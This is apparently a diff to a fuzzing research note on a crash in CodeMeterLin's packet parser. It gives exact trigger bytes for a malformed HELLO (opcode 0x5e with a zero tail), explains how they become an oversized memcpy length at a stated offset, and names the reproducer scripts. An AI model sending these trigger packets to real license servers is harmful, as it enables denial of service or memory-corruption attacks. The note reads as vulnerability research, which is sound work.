@@ -2,30 +2,38 @@
 
 ## Completed Result
 
-This process has now produced a deterministic single-packet reproducer.
-
-The trigger is not a concurrent-session race and not a `0x64` request. It is a
-malformed HELLO whose cleartext is the canonical HELLO prefixed with five
-bytes:
+This process produced the first deterministic single-packet reproducer and led
+to the current opcode-`0x5e` crash model. The current preferred HELLO trigger
+is the simplified zero-tail prefix:
 
 ```text
-5e 35 5e d6 f2 || canonical HELLO with fresh client token
+5e 00 00 00 00 || canonical HELLO with fresh client token
 ```
 
 The prefixed HELLO starts:
 
 ```text
-5e 35 5e d6 f2 0a 00 00 00 00 00 00 10 00 00 28
+5e 00 00 00 00 0a 00 00 00 00 00 00 10 00 00 28
 ```
 
 The vulnerable parser later reads those bytes as:
 
 ```text
-0xd65e355e  0x00000af2  0x00000000  0x28000010
+0x0000005e  0x00000a00  0x00000000  0x28000010
 ```
 
 `0x28000010` is stored at `this + 0x68` and reaches the `memcpy` length at
 `CodeMeterLin + 0x8f431d`.
+
+The original reduction found the historical prefix:
+
+```text
+5e 35 5e d6 f2 || canonical HELLO with fresh client token
+```
+
+That prefix remains important provenance, but later ECDH prefix fuzzing showed
+that the random-looking tail is not special. A post-HELLO ACK route also
+reaches the same crash via a zero-tail opcode-`0x5e` prefix.
 
 Artifacts from the successful attribution run:
 
@@ -48,6 +56,8 @@ New scripts:
 ```text
 fuzzer/samc_light_supervisor.py     high-throughput attribution supervisor
 fuzzer/repro_prefixed_hello.py      deterministic one-packet reproducer
+fuzzer/repro_prefixed_ack_standalone.py
+                                    standalone two-frame ACK reproducer
 ```
 
 The remainder of this file is retained as the historical reduction process
